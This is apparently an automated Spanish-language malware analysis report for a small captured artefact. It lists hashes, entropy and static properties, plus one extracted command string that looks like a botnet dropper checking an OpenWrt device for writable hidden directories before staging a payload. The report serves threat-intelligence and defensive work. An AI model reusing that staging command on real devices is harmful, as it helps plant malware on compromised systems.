# 🧬 Payload Analysis

`807ceb2bc923e7040f2a4d7947d971950883f2a1682d5ffd604e510c6ad64b89`

## 📌 Resumen

Artefacto de 1.1 KiB. Entropía registrada: 5.33. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🗓️ Registro

- **Registrado:** `2026-08-09T18:40:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `807ceb2bc923e7040f2a4d7947d971950883f2a1682d5ffd604e510c6ad64b89`
- **MD5:** `d701f66ca91cef3830f1b08d16b31095`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.1 KiB |
| Entropía | 5.33 |
| Strings | 25 |

## 🖥️ Comandos observados / extraídos

```text
[4lkeomeo@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /d
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | [4lkeomeo@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /d | strings |
| hash | 807ceb2bc923e7040f2a4d7947d971950883f2a1682d5ffd604e510c6ad64b89 | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
